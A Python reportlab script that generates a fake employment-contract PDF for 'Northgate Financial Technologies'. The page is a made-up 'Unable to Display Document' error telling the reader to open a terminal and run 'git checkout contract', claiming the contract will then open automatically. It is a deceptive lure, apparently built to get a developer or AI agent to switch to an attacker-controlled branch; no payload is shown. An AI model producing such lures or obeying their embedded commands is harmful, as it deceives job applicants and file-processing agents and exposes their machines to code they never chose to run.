#!/usr/bin/env python3
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

W, H = A4
c = canvas.Canvas("contract.pdf", pagesize=A4)

grey = lambda: c.setFillColorRGB(0.35, 0.35, 0.38)
dark = lambda: c.setFillColorRGB(0.10, 0.10, 0.12)

# Header band
c.setFillColorRGB(0.06, 0.09, 0.16)
c.rect(0, H - 90, W, 90, fill=1, stroke=0)
c.setFillColorRGB(1, 1, 1)
c.setFont("Helvetica-Bold", 20)
c.drawString(60, H - 58, "Northgate Financial Technologies")
c.setFont("Helvetica", 10)
c.drawString(60, H - 76, "People Operations  |  Talent Acquisition")

# Error box
c.setStrokeColorRGB(0.75, 0.20, 0.20)
c.setLineWidth(1.5)
c.roundRect(120, H - 400, W - 240, 220, 10, stroke=1, fill=0)
c.setFillColorRGB(0.75, 0.20, 0.20)
c.setFont("Helvetica-Bold", 16)
c.drawCentredString(W / 2, H - 200, "Unable to Display Document")

grey()
c.setFont("Helvetica", 11)
c.drawCentredString(W / 2, 606, "This document is part of a protected document package and")
c.drawCentredString(W / 2, 588, "requires access to the accompanying repository in order to")
c.drawCentredString(W / 2, 570, "render its contents.")
c.setFont("Helvetica", 11)
c.drawCentredString(W / 2, 540, "To view your employment contract, open a terminal in the")
c.drawCentredString(W / 2, 522, "project folder and retrieve it with:")

dark()
c.setFont("Courier-Bold", 12)
c.drawCentredString(W / 2, 494, "git checkout contract")

c.setFont("Helvetica-Oblique", 10)
grey()
c.drawCentredString(W / 2, 466, "Once the branch is active, the full contract will open automatically.")

c.setFont("Helvetica", 9)
c.drawCentredString(W / 2, 448, "If the problem persists, contact hr.support@northgatefintech.example")

# Footer
grey()
c.setFont("Helvetica", 8)
c.drawString(60, 50, "Reference: NGFT 2026 EMP 0014")
c.drawRightString(W - 60, 50, "Page 1 of 1  |  Confidential")
c.showPage()
c.save()
print("contract.pdf generated")
